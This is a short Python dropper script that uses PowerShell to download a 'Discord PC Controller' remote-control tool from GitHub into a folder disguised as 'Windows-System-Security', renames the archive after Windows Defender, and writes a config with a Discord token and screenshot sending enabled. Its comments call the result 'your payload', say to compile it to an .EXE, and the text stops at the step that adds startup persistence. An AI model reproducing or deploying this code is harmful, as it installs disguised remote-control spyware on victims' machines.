#Imports
from subprocess import run #To run commands in cmd

#Method to run commands and handle errors
def installStep(command):
    try:
        run(["powershell", command], shell=False, check=True)
    except:
        exit()

#Step 1: Create a working directory to download all of the files to
installStep("mkdir Windows-System-Security") #Totally not malware, trust

#Step 2: Download the application to run the Discord bot
installStep("curl https://github.com/3XAY/DiscordPCController/releases/latest/download/Discord.PC.Controller.zip -o Windows-System-Security/Windows-Defender-C.zip")

#Step 3: Decompress the zip file
installStep("Expand-Archive -Force Windows-System-Security/Windows-Defender-C.zip Windows-System-Security/")

#Step 4: Remove the zip file
installStep("Remove-Item -Path Windows-System-Security/Windows-Defender-C.zip -Force")

#Step 5: Create the .env file
#NOTE: When creating your payload, make sure to put YOUR Discord ID and token, then compress it to an .EXE file
#Check README.md for more information
with open("Windows-System-Security\Discord PC Controller\.env", "w") as f:
	f.write("DISCORD_TOKEN=ENTERYOURTOKENHERE\n")
	f.write("DISCORD_ID=ENTERYOURIDHERE\n")
	f.write("SEND_SCREENSHOT=True")

#Step 6: Make sure the app runs on startup